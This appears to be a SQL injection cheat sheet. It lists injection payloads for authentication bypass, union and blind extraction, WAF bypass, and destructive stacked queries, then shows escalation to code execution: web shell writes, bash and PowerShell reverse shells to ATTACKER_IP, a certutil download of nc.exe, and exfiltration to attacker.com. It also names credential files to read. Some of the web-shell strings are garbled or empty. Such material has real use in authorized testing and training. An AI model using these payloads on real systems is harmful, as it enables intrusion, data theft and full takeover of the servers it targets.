Basic Concepts

SQL Injection (SQLi): A vulnerability that allows an attacker to manipulate SQL queries via unsanitized user input.

Example SQL query:

SELECT * FROM users WHERE user_name='leon';

Vulnerable backend example (PHP):

$sql_query = "SELECT * FROM users WHERE user_name= '$uname' AND password='$passwd'";

Core Mental Model

  • User input is concatenated into SQL query
  • Query structure becomes attacker-controlled
  • Goal is to change logic, extract data, or execute system actions
Types of SQL Injection

Error-based SQLi

Forces database errors to leak internal information.

' OR 1=1 --

Union-based SQLi

Combines attacker results with original query output.

' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' UNION SELECT null, database(), user(), @@version --
' UNION SELECT null, table_name, column_name 
FROM information_schema.columns 
WHERE table_schema=database() --

Blind SQL Injection

Boolean-based: 
' AND 1=1 --
' AND 1=2 --
' AND IF(SUBSTRING(user(),1,1)='a',1,0) --
Time-based: 
' AND IF(1=1, SLEEP(5), 0) --

Stacked Queries (IMPORTANT - often missed)

'; DROP TABLE users; --

Works only if multiple statements are allowed.

Initial Testing Payloads

Authentication bypass

' OR 1=1 --
" OR 1=1 --
') OR 1=1 --

Alternative comparisons

' OR '1'='1
" OR "1"="1

Delay testing

' OR SLEEP(5) --
' AND SLEEP(5) --

Comment styles

/* */
Filter Bypass Techniques

Common bypass variations

' OR 1=1 -- -
' OR 1=1#
' OR '1'='1'--

Whitespace bypass

'/**/OR/**/1=1--

Encoding tricks

%27 OR 1=1 --

Case manipulation

' oR 1=1 --

Inline comments (WAF bypass)

'/*!OR*/1=1--
UNION-Based Injection

Requirements

  • Same number of columns
  • Compatible data types

Find number of columns

' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--

Basic payload

' UNION SELECT null,null,null --

System enumeration

' UNION SELECT null, database(), user(), @@version --

Schema enumeration

' UNION SELECT null, table_name, column_name 
FROM information_schema.columns 
WHERE table_schema=database() --
Blind SQL Injection Deep Dive

Boolean-based extraction

Character-by-character extraction

Time-based extraction

' AND IF(ASCII(SUBSTRING(user(),1,1))=97, SLEEP(5), 0) --

SQL Injection → RCE (Advanced Exploitation)

Concept

SQL Injection can escalate to Remote Code Execution (RCE) when the database user has elevated privileges or dangerous functions are enabled.

  • File read access (data exfiltration)
  • File write access (web shell creation)
  • Command execution via DB features

MySQL / MariaDB

Read local files:

SELECT LOAD_FILE('/etc/passwd');

Write web shell:

SELECT ''
INTO OUTFILE '/var/www/html/shell.php';

Reverse Shell via Web Shell (step after upload):


# Start listener on attacker machine
nc -lvnp 4444
        

# Trigger reverse shell via browser
http://target/shell.php?cmd=bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'

Alternative direct reverse shell payload:


SELECT '& /dev/tcp/ATTACKER_IP/4444 0>&1\'"); ?>'
INTO OUTFILE '/var/www/html/rev.php';

MSSQL (Microsoft SQL Server)

Command execution:

EXEC xp_cmdshell 'whoami';

Reverse shell (PowerShell example):


EXEC xp_cmdshell 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command 
New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4444);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
$sendback = (iex $data 2>&1 | Out-String );
$sendback2 = $sendback + "PS " + (pwd).Path + "> ";
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$stream.Write($sendbyte,0,$sendbyte.Length);
$stream.Flush()
}';

PostgreSQL

Command execution:

COPY (SELECT '') TO PROGRAM 'id';

Reverse shell:


COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"';

Web Shell → Reverse Shell Flow (REAL ATTACK PATH)

  1. Exploit SQLi → write web shell
  2. Access shell via HTTP
  3. Trigger reverse shell from browser
  4. Catch shell on attacker listener

Classic Attack Chain


SQLi → FILE WRITE → Web Shell → Reverse Shell → System Access

One-liner Mental Model


If SQLi allows FILE or EXEC → reverse shell is always the end goal
SQL Injection → RCE & Reverse Shells (Linux / Windows)

Core Concept

SQL Injection becomes Remote Code Execution (RCE) when the database user has dangerous privileges or the DBMS exposes operating system functionality.

The attacker goal is no longer just data extraction — it becomes full system compromise. 


SQLi → DB Enumeration → File Write / Command Execution
→ Web Shell → Reverse Shell → Interactive System Access

Linux-Oriented SQLi Exploitation

Common Stack

  • MySQL / MariaDB
  • PostgreSQL
  • Apache / Nginx
  • PHP applications

Typical Goals

  • Read sensitive files
  • Write PHP web shell
  • Execute Linux commands
  • Spawn reverse shell

1. File Read (MySQL)

Read local system files:

SELECT LOAD_FILE('/etc/passwd');

Useful targets:


/etc/passwd
/etc/shadow
/var/www/html/config.php
/home/user/.ssh/id_rsa

2. Web Shell Write (MySQL)

If MySQL has FILE privileges and the web root is writable, SQLi can directly create a PHP web shell. 


SELECT ''
INTO OUTFILE '/var/www/html/shell.php';

Trigger command execution:


http://TARGET/shell.php?cmd=id
http://TARGET/shell.php?cmd=whoami

3. Reverse Shell (Linux)

Attacker listener:

nc -lvnp 4444

Trigger reverse shell:


http://TARGET/shell.php?cmd=bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'

Alternative payload:


SELECT '& /dev/tcp/ATTACKER_IP/4444 0>&1\'"); ?>'
INTO OUTFILE '/var/www/html/rev.php';

4. PostgreSQL Command Execution

PostgreSQL can execute operating system commands using COPY TO PROGRAM. 


COPY (SELECT '') TO PROGRAM 'id';

Reverse shell:


COPY (SELECT '') TO PROGRAM
'bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"';

Windows-Oriented SQLi Exploitation

Common Stack

  • Microsoft SQL Server (MSSQL)
  • IIS Web Server
  • ASP / ASPX applications
  • Windows Server environments

Typical Goals

  • Execute Windows commands
  • Spawn PowerShell reverse shell
  • Drop payloads or binaries
  • Enumerate Active Directory environment

1. Command Execution via xp_cmdshell

MSSQL exposes dangerous functionality through xp_cmdshell if enabled. 

EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'ipconfig';
EXEC xp_cmdshell 'net user';

2. Enable xp_cmdshell (if disabled)


EXEC sp_configure 'show advanced options',1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1;
RECONFIGURE;

3. PowerShell Reverse Shell

Attacker listener:

nc -lvnp 4444

PowerShell reverse shell:


EXEC xp_cmdshell 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command
$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4444);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
$sendback = (iex $data 2>&1 | Out-String );
$sendback2 = $sendback + "PS " + (pwd).Path + "> ";
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$stream.Write($sendbyte,0,$sendbyte.Length);
$stream.Flush()
}';

4. File Download via certutil

Windows environments often allow payload download through certutil. 


EXEC xp_cmdshell 'certutil -urlcache -split -f
http://ATTACKER_IP/nc.exe C:\Windows\Temp\nc.exe';

5. Spawn Netcat Shell


EXEC xp_cmdshell 'C:\Windows\Temp\nc.exe ATTACKER_IP 4444 -e cmd.exe';

Real Pentest Mental Model


1. Detect SQL Injection
2. Identify DBMS
3. Enumerate privileges
4. Test FILE or EXEC capabilities
5. Gain command execution
6. Spawn reverse shell
7. Upgrade shell / privilege escalation

Important Notes

  • RCE depends heavily on DB user privileges
  • FILE privilege is critical in MySQL exploitation
  • xp_cmdshell is often disabled by default
  • Reverse shells are usually the final goal
  • Blind SQLi can still lead to RCE
  • Web shell upload is one of the most common Linux attack paths
Out-of-Band (OOB) SQL Injection

Used when no direct output is visible.

SELECT LOAD_FILE(CONCAT('\\\\attacker.com\\', database()));

Can also use DNS/HTTP exfiltration in advanced scenarios.

Practical Exploitation Flow
  1. Detect injection point (', ", boolean change)
  2. Identify SQLi type (error / union / blind / time)
  3. Determine number of columns
  4. Extract DB version and schema
  5. Enumerate tables and users
  6. Escalate to file read or RCE if possible
Important Notes
  • Always confirm injection type before payload blasting
  • Blind SQLi is often the real target in modern apps
  • WAF bypass requires adaptation, not guessing
  • DBMS identification is critical (MySQL vs MSSQL vs PostgreSQL)
